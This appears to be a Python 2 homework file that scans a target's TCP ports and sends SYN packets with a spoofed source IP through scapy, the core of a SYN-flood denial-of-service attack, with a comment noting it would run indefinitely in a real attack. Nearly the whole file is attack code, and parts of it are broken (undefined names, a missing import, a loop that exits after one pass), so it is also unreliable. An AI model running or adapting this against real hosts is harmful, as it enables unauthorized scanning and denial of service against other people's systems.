import socket
import scapy as scapy

class TcpAttack():
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self,rangeStart, rangeEnd):
        openPorts = open("openports.txt", "w")

        for portNum in range(rangeStart,rangeEnd + 1):
            try:
                port = socket.socket()
                port.settimeout(0.1)  # quickly close out port if open
                port.connect((self.targetIP, portNum)) #connect to IP + port number
                openPorts.write(str(portNum) + "\n") #add open port number to output fiel
            except: #catch socket.timeout and failure to connect (port closed)
                pass
        openPorts.close()

    def attackTarget(self, port):

        #Initialize port connector to check if port is open
        portConnection = socket.socket()
        portConnection.settimeout(0.1)

        for i in range(10): #send 10 packets for HW, theoretically infinite for a real DoS attack
            try:
                #Test if port is open
                portConnection.connect((self.targetIP, port))

                #Create IP and TCP headers
                #IP source is spoof IP address, destination is provided target
                IP_header = scapy.all.IP(src = self.spoofIP, dst = self.targetIP)
                #TCP source port is random port number, dest port is given port, flag makes it a SYN packet
                TCP_header = scapy.all.TCP(flags = 'S', sport = RandShort(), dport = port)
                try:
                    scapy.all.send(IP_header / TCP_header) #send packet of IP + TCP header
                except:
                    print "Attack failed" #packet failed to send
                    return 0
                return 1 #attack executed
            except: #Return 0 if specified port is closed
                return 0 #connection failed

if __name__ == "__main__":
    count = 1
    for i in range(count):                                                     #(5)
        IP_header = scapy.IP(src = "123.45.67.89", dst = "192.168.1.87")                                #(6)
        TCP_header = scapy.TCP(flags = "S", sport = scapy.RandShort(), dport = 80)     #(7)
        packet = IP_header / TCP_header                                          #(8)
        try:                                                                     #(9)
           scapy.send(packet)                                                          #(10)
        except Exception as e:                                                   #(11)
           print e                                                               #(11)
